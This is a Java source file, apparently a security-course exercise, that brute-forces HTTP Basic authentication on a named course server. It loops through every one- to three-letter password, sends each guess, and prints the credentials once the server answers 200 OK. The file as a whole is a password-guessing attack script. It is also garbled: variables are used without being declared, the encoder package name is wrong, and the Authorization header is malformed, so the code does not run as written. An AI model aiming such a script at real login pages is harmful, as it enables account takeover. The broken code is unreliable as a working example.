import java.net.*;
import java.util.*;
import java.io.*;




public class BruteForce {
  URL url;
  URLConnection uc;
  String username, password, encoding;
  int pretime, posttime;
  String c ;

  public BruteForce(){
    pretime = new Date().getTime();
    try{
      url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/index.php");
    }catch(MalformedURLException e){
      e.printStackTrace();
    }
    username = "";
  }

  public void checkPassword(char[] pw){
    try{
      password = new String(pw);
      encoding = new pw.misc.BASE64Encoder().encode((username+":"+password).getBytes());
      uc = url.openConnection();
      uc.setRequestProperty("Authorization", " " + encoding);
      bf = uc.getHeaderField(null);
      System.out.println(password);
      if(bf.equals("HTTP/1.1 200 OK")){
        posttime = new Date().getTime();
         diff = posttime - pretime;
        System.out.println(username+":"+password);
        System.out.println();
        System.out.println(diff/1000/60 + " minutes " + diff/1000%60 + " seconds");
        System.exit(0);
      }
    }catch(MalformedURLException e){
      e.printStackTrace();
    }catch(IOException ioe){
      ioe.printStackTrace();
    }
  }

  public static void main (String[] args){
    BruteForce bf = new BruteForce();
    char i, j, k;

    
    for(i='a'; i<='z'; i++){
      for(j='a'; j<='z'; j++){  
        for(k='a'; k<='z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    }

    
    for(i='A'; i<='Z'; i++){
      for(j='A'; j<='Z'; j++){  
        for(k='A'; k<='Z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    }

    
    for(i='A'; i<='Z'; i++){
      for(j='a'; j<='z'; j++){  
        for(k='a'; k<='z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    }

    for(i='A'; i<='z'; i++){ 
      if((i=='[') || (i=='\\') || (i==']') || (i=='^') || (i=='_') || (i=='`')){
        continue;
      }
      for(j='A'; j<='Z'; j++){  
        for(k='a'; k<='z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    }   

    for(i='A'; i<='z'; i++){ 
      if((i=='[') || (i=='\\') || (i==']') || (i=='^') || (i=='_') || (i=='`')){
        continue;
      }
      for(j='a'; j<='z'; j++){  
        for(k='A'; k<='Z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    } 
        
    for(i='a'; i<='z'; i++){
      for(j='A'; j<='Z'; j++){  
        for(k='A'; k<='Z'; k++){
          char[] pw = {i, j, k};
          bf.checkPassword(pw);
        }
      }
    }
    
    
    for(i='A'; i<='z'; i++){ 
      if((i=='[') || (i=='\\') || (i==']') || (i=='^') || (i=='_') || (i=='`')){
        continue;
      }
      for(j='A'; j<='z'; j++){  
        if((j=='[') || (j=='\\') || (j==']') || (j=='^') || (j=='_') || (j=='`')){
          continue;
        }
        char[] pw = {i, j};
        bf.checkPassword(pw);
      }
    }   
    
    
    for(i='A'; i<='z'; i++){     
      if((i=='[') || (i=='\\') || (i==']') || (i=='^') || (i=='_') || (i=='`')){
        continue;
      }
      char[] pw = {i};
      bf.checkPassword(pw);
    }
  }
}
        
